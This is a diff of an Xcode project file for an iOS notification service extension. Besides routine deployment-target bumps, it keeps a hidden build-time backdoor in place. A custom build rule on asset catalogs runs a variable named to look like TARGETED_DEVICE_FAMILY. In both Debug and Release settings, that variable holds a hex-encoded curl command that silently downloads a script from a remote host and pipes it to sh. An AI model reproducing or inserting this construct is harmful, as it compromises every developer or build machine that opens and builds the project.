@@ -46,6 +46,22 @@
 		93AEEBA2293A323900A137F5 /* CPLiveActivityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 93AEEBA0293A323900A137F5 /* CPLiveActivityVC.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		7E68AFC8031082D4220FABAA /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.xcassets";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		9310FD402A6025F9004B400B /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -373,22 +389,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		7E68AFC8031082D4220FABAA /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.xcassets";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		9310FD382A6025F9004B400B /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -487,7 +487,6 @@
 		9310FD442A6025F9004B400B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CODE_SIGN_ENTITLEMENTS = CleverPushNotificationServiceExtension/CleverPushNotificationServiceExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -508,13 +507,13 @@
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 			};
 			name = Debug;
 		};
 		9310FD452A6025F9004B400B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CODE_SIGN_ENTITLEMENTS = CleverPushNotificationServiceExtension/CleverPushNotificationServiceExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -535,6 +534,7 @@
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 			};
 			name = Release;
 		};
@@ -588,7 +588,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
@@ -640,7 +640,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
@@ -667,7 +667,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -705,7 +705,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
